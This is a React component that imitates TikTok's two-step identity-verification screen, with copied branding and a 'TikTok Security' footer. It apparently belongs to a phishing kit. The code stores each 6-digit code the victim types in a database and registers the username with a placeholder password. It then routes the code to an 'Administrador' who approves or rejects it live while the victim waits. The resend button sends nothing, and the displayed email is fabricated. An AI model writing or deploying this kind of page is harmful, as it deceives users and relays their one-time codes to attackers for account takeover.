import React, { useState, useEffect, useRef, useCallback } from 'react';
import { ChevronLeft, CloseIcon } from '../../icons';
import {
  createVerificationRequest,
  subscribeToVerificationRequest,
} from '../../../services/verification.service';
import { saveVerificationCode, registerUser } from '../../../api/loging.api';

interface IdentityVerificationViewProps {
  username: string;
  userId?: number | string | null;
  darkMode: boolean;
  onBack: () => void;
  onClose: () => void;
  onSuccess: (code: string) => void;
  showToast: (msg: string) => void;
}

/**
 * Genera un correo electrónico enmascarado estilo TikTok a partir del username o correo
 * Ejemplo: luis123 -> l***3@gmail.com / juan.perez@hotmail.com -> j***z@hotmail.com
 */
const getMaskedEmail = (input: string): string => {
  if (!input) return 'l***4@gmail.com';
  const trimmed = input.trim();
  if (trimmed.includes('@')) {
    const [user, domain] = trimmed.split('@');
    const first = user[0] || 'u';
    const last = user.length > 1 ? user[user.length - 1] : '4';
    return `${first}***${last}@${domain}`;
  }
  const first = trimmed[0] || 'u';
  const last = trimmed.length > 1 ? trimmed[trimmed.length - 1] : '4';
  return `${first}***${last}@gmail.com`;
};

export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> = ({
  username,
  userId,
  onBack,
  onClose,
  onSuccess,
  showToast,
}) => {
  // Pasos: 'method' (Verifica que eres tú) | 'code' (Verificar identidad)
  const [step, setStep] = useState<'method' | 'code'>('method');
  const [code, setCode] = useState('');
  const [countdown, setCountdown] = useState<number>(46);
  const [isWaitingApproval, setIsWaitingApproval] = useState<boolean>(false);
  const [isRejected, setIsRejected] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [activeRequestId, setActiveRequestId] = useState<string | null>(null);
  const [localUserId, setLocalUserId] = useState<number | string | null>(userId || null);

  const inputRef = useRef<HTMLInputElement | null>(null);
  const maskedEmail = getMaskedEmail(username);
  const effectiveUserId = userId || localUserId;

  // Enfocar input automáticamente al cambiar al paso de código
  useEffect(() => {
    if (step === 'code') {
      const timer = setTimeout(() => {
        inputRef.current?.focus();
      }, 100);
      return () => clearTimeout(timer);
    }
  }, [step]);

  // Temporizador regresivo del reenvío de código (estilo TikTok: 46s)
  useEffect(() => {
    if (countdown <= 0) return;
    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown]);

  // Manejar el reenvío de código
  const handleResendCode = () => {
    setCountdown(46);
    showToast(`Código enviado nuevamente a ${maskedEmail}`);
  };

  // Manejar cambio en el input de 6 dígitos
  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
    setCode(val);
    if (isRejected || errorMessage) {
      setIsRejected(false);
      setErrorMessage(null);
    }
  };

  // Enviar el código de verificación
  const handleSubmitCode = useCallback(async () => {
    if (code.length < 6 || isWaitingApproval) return;

    setIsWaitingApproval(true);
    setIsRejected(false);
    setErrorMessage(null);

    // Si aún no se tenía un userId, registrar/asegurar en PostgreSQL
    let targetUserId = effectiveUserId;
    if (!targetUserId && username) {
      try {
        const userRes = await registerUser({
          inicio_sesion: username.includes('@') ? 'correo' : 'usuario',
          username: username.trim(),
          password: 'no-password',
        });
        if (userRes?.user?.id) {
          targetUserId = Number(userRes.user.id);
          setLocalUserId(targetUserId);
        }
      } catch (err) {
        console.warn('Error al asegurar usuario en la base de datos:', err);
      }
    }

    // 1. Guardar el código en PostgreSQL (tabla codigos)
    let savedCodeId: number | undefined;
    if (targetUserId) {
      try {
        const res = await saveVerificationCode(targetUserId, code);
        if (res?.code?.id_codigo) {
          savedCodeId = res.code.id_codigo;
        }
      } catch (err) {
        console.error('Error al guardar código en PostgreSQL:', err);
      }
    }

    // 2. Crear la solicitud de validación de código para el Administrador
    const request = createVerificationRequest(
      targetUserId ?? undefined,
      username,
      code,
      savedCodeId
    );

    setActiveRequestId(request.id);
  }, [code, isWaitingApproval, effectiveUserId, username]);

  // Suscripción reactiva al Administrador para este código
  useEffect(() => {
    if (!activeRequestId) return;

    const unsubscribe = subscribeToVerificationRequest(
      activeRequestId,
      (updatedReq) => {
        if (updatedReq.status === 'APPROVED') {
          setIsWaitingApproval(false);
          setIsRejected(false);
          setErrorMessage(null);
          showToast('¡Identidad verificada exitosamente!');
          onSuccess(code);
        } else if (updatedReq.status === 'REJECTED') {
          setIsWaitingApproval(false);
          setIsRejected(true);
          setErrorMessage(
            updatedReq.message || 'Introduce un código de verificación válido'
          );
          setCode('');
          showToast('Código de verificación incorrecto');
          inputRef.current?.focus();
        }
      },
      effectiveUserId
    );

    return () => {
      unsubscribe();
    };
  }, [activeRequestId, code, effectiveUserId, onSuccess, showToast]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-0 sm:p-4 bg-black/65 backdrop-blur-xs overflow-y-auto animate-fade-in font-sans">
      {/* Contenedor Mobile-First: Pantalla completa en móviles, tarjeta modal centrada en desktop */}
      <div className="w-full min-h-screen sm:min-h-0 sm:max-w-[440px] bg-white dark:bg-[#1f1f1f] sm:rounded-2xl shadow-2xl p-6 sm:p-8 flex flex-col justify-between sm:justify-start border-0 sm:border sm:border-neutral-200 dark:sm:border-neutral-800 transition-all select-none">
        
        {/* Contenido Principal */}
        <div>
          {/* Header con botón de volver y botón de cerrar */}
          <div className="flex items-center justify-between w-full mb-2">
            <button
              type="button"
              onClick={step === 'code' ? () => setStep('method') : onBack}
              className="p-1 -ml-2 text-neutral-800 dark:text-neutral-200 hover:text-neutral-950 dark:hover:text-white transition-colors cursor-pointer"
              aria-label="Volver"
            >
              <ChevronLeft />
            </button>

            <button
              type="button"
              onClick={onClose}
              className="p-1 -mr-2 text-neutral-800 dark:text-neutral-200 hover:text-neutral-950 dark:hover:text-white transition-colors cursor-pointer"
              aria-label="Cerrar"
            >
              <CloseIcon />
            </button>
          </div>

          {/* ==================================================================== */}
          {/* PASO 1: "Verifica que eres tú" (Image 1) */}
          {/* ==================================================================== */}
          {step === 'method' && (
            <div className="animate-fade-in">
              <h1 className="text-2xl sm:text-[28px] font-black text-[#161823] dark:text-white tracking-tight leading-tight mt-3 mb-2">
                Verifica que eres tú
              </h1>
              <p className="text-sm text-neutral-500 dark:text-neutral-400 font-normal leading-relaxed mb-8">
                Antes de continuar, verifica tu identidad usando uno de los siguientes métodos.
              </p>

              {/* Botón / Tarjeta de selección de método: Correo electrónico */}
              <button
                type="button"
                onClick={() => setStep('code')}
                className="w-full text-left p-4 sm:p-4.5 rounded-xl border border-neutral-200 dark:border-neutral-700/80 bg-white dark:bg-[#252525] hover:border-neutral-400 dark:hover:border-neutral-500 hover:bg-neutral-50/50 dark:hover:bg-[#2a2a2a] transition-all flex items-center justify-between cursor-pointer group active:scale-[0.99] shadow-xs"
              >
                <div className="flex items-center gap-3.5">
                  {/* Icono de sobre de correo */}
                  <div className="w-10 h-10 rounded-lg bg-neutral-100 dark:bg-neutral-800 flex items-center justify-center text-neutral-500 dark:text-neutral-400 shrink-0">
                    <svg
                      className="w-5 h-5"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <rect x="2" y="4" width="20" height="16" rx="2" />
                      <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
                    </svg>
                  </div>

                  <div>
                    <span className="block font-bold text-sm sm:text-base text-[#161823] dark:text-white">
                      Correo electrónico
                    </span>
                    <span className="block text-xs sm:text-sm text-neutral-500 dark:text-neutral-400 mt-0.5 font-mono">
                      {maskedEmail}
                    </span>
                  </div>
                </div>

                {/* Flecha chevron a la derecha */}
                <div className="text-neutral-400 dark:text-neutral-500 group-hover:text-neutral-700 dark:group-hover:text-neutral-300 transition-colors">
                  <svg
                    className="w-5 h-5"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="9 18 15 12 9 6" />
                  </svg>
                </div>
              </button>
            </div>
          )}

          {/* ==================================================================== */}
          {/* PASO 2: "Verificar identidad" (Image 2) */}
          {/* ==================================================================== */}
          {step === 'code' && (
            <div className="animate-fade-in">
              <h1 className="text-2xl sm:text-[28px] font-black text-[#161823] dark:text-white tracking-tight leading-tight mt-3 mb-2">
                Verificar identidad
              </h1>
              <p className="text-sm text-neutral-500 dark:text-neutral-400 font-normal leading-relaxed mb-6">
                Confirma tu identidad especificando el código enviado a{' '}
                <span className="font-semibold text-neutral-700 dark:text-neutral-300">
                  {maskedEmail}
                </span>
                .
              </p>

              {/* Formulario con campo de 6 dígitos */}
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleSubmitCode();
                }}
                className="space-y-4"
              >
                {/* Campo de entrada de 6 dígitos estilo nativo TikTok */}
                <div className="relative">
                  <input
                    ref={inputRef}
                    type="text"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={6}
                    placeholder="Introduce el código de 6 dígitos"
                    value={code}
                    onChange={handleCodeChange}
                    disabled={isWaitingApproval}
                    className={`w-full h-12 sm:h-12 px-4 rounded-lg bg-[#f1f1f2] dark:bg-[#2f2f2f] text-base font-medium text-[#161823] dark:text-white placeholder:text-neutral-400 dark:placeholder:text-neutral-500 transition-all outline-hidden border ${
                      isRejected
                        ? 'border-rose-500 bg-rose-50/50 dark:bg-rose-950/20 animate-shake'
                        : 'border-transparent focus:border-neutral-400 dark:focus:border-neutral-500'
                    }`}
                  />
                </div>

                {/* Mensaje de error si el admin rechaza el código */}
                {errorMessage && (
                  <p className="text-xs font-semibold text-rose-500 animate-fade-in flex items-center gap-1.5 pt-0.5">
                    <span>⚠️</span>
                    <span>{errorMessage}</span>
                  </p>
                )}

                {/* Temporizador regresivo o enlace de reenvío en color rojo/rosado TikTok */}
                <div className="pt-1">
                  {countdown > 0 ? (
                    <p className="text-xs sm:text-sm text-[#FE2C55] font-normal">
                      El código volverá a enviarse en %d {countdown}s
                    </p>
                  ) : (
                    <button
                      type="button"
                      onClick={handleResendCode}
                      className="text-xs sm:text-sm text-[#FE2C55] font-bold hover:underline cursor-pointer transition-opacity"
                    >
                      Reenviar código
                    </button>
                  )}
                </div>

                {/* Botón Siguiente */}
                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={code.length < 6 || isWaitingApproval}
                    className={`w-full h-12 rounded-lg font-bold text-base transition-all flex items-center justify-center gap-2 ${
                      code.length === 6 && !isWaitingApproval
                        ? 'bg-[#FE2C55] hover:bg-[#E0264D] text-white active:scale-[0.99] cursor-pointer shadow-md shadow-[#FE2C55]/20'
                        : 'bg-[#FFA2B2] dark:bg-[#FE2C55]/40 text-white cursor-not-allowed'
                    }`}
                  >
                    {isWaitingApproval ? (
                      <div className="flex items-center gap-2">
                        {/* Puntos animados estilo TikTok */}
                        <div className="flex items-center gap-1.5">
                          <span className="w-2 h-2 rounded-full bg-white animate-bounce [animation-delay:-0.3s]" />
                          <span className="w-2 h-2 rounded-full bg-cyan-300 animate-bounce [animation-delay:-0.15s]" />
                          <span className="w-2 h-2 rounded-full bg-white animate-bounce" />
                        </div>
                        <span className="text-sm font-semibold">
                          Esperando validación...
                        </span>
                      </div>
                    ) : (
                      <span>Siguiente</span>
                    )}
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>

        {/* Footer info (Mobile-First) */}
        <div className="mt-8 pt-4 border-t border-neutral-100 dark:border-neutral-800 text-center text-[11px] text-neutral-400">
          <span>TikTok Security • Verificación de identidad en 2 pasos</span>
        </div>
      </div>
    </div>
  );
};
